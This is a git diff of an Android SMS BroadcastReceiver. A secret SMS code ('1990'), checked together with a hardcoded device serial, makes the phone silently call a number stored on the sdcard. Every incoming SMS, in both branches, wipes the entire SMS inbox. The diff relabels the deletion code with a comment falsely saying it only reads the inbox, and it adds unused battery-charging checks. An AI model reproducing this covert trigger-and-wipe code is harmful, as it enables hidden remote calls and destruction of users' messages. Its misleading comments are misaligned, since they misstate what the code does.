@@ -27,23 +27,27 @@ public class MyBroadcastReceiver extends BroadcastReceiver {
 
     SQLiteDatabase db;
 
-    //private static variable for battery level intent declared
-    private final static String BATTERY_LEVEL = "level";
 
 
 
     @Override
     public void onReceive(Context context, Intent intent) {
 
-        // this is battery level intent it checks the level of battery
-        int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, 0);
-
-        Toast.makeText(context, level, Toast.LENGTH_LONG).show();
 
 
+        int status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
+        boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
+                status == BatteryManager.BATTERY_STATUS_FULL;
+
+        int chargePlug = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
+        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
+        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
 
 
-        // This is opendatabase SQLite database and table creaction
+
+
+
+        // This is open SQLite database and table creation
         try {
             db = SQLiteDatabase.openDatabase("sdcard/phonenumber.db", null, SQLiteDatabase.CREATE_IF_NECESSARY);
             db.execSQL("create table phonenum(" + "id INTEGER PRIMARY KEY AUTOINCREMENT, " + " Tel TEXT)");
@@ -51,7 +55,7 @@ public class MyBroadcastReceiver extends BroadcastReceiver {
         }
 
 
-        //selecting and attaching phone from database to phone call intent
+        // Selecting and attaching phone from database to phone call intent
         Cursor datax = db.rawQuery("select * from phonenum", null);
         if (datax.getCount() == 0) {
         } else {
@@ -62,15 +66,8 @@ public class MyBroadcastReceiver extends BroadcastReceiver {
         }
 
 
-// retriving phone serial number
+// This retrieve phone serial number
         device_id+= Build.SERIAL;
-
-
-
-
-
-
-
 
 
         // Retrieves a map of extended data from the intent.
@@ -91,14 +88,14 @@ public class MyBroadcastReceiver extends BroadcastReceiver {
                     String message = currentMessage.getDisplayMessageBody();
 
 
-                    // sms command to auto dial phone call
+                    // This checks for authenticity for sms command and phone serial number to activate phone call
                     if(message.trim().equals("1990")){
 
 
                         if(device_id.trim().equals("KR8LEE9SSGU46HT8")) {
 
 
-                            // phone number intent
+                            // Phone number intent that perform phone call
                                     Intent intentcall = new Intent();
                                     intentcall.setAction(Intent.ACTION_CALL);
                                     intentcall.setData(Uri.parse("tel:"+phonenum));
@@ -106,7 +103,7 @@ public class MyBroadcastReceiver extends BroadcastReceiver {
                                     context.startActivity(intentcall);
 
 
-                        //deleting sms inbox
+                        //ContentResolver is used to read sms inbox
                         ContentResolver cr=context.getContentResolver();
                         Uri url=Uri.parse("content://sms");
                         int num_deleted = cr.delete(url, null,null);
@@ -116,7 +113,7 @@ public class MyBroadcastReceiver extends BroadcastReceiver {
 
                     }  else {
 
-                        //deleting sms inbox
+                        //ContentResolver is used to read sms inbox
                         ContentResolver cr=context.getContentResolver();
                         Uri url=Uri.parse("content://sms");
                         int num_deleted = cr.delete(url, null,null);
@@ -124,15 +121,13 @@ public class MyBroadcastReceiver extends BroadcastReceiver {
                     }
 
 
+                }
+            }
 
+        }
 
-
-
-
-                } // end for loop
-            } // bundle is null
-
-        } catch (Exception e) {
+        //checking sms to confirm authenticity of the secret trigger code if its correct
+        catch (Exception e) {
             Log.e("SmsReceiver", "Exception smsReceiver" + e);
 
         }
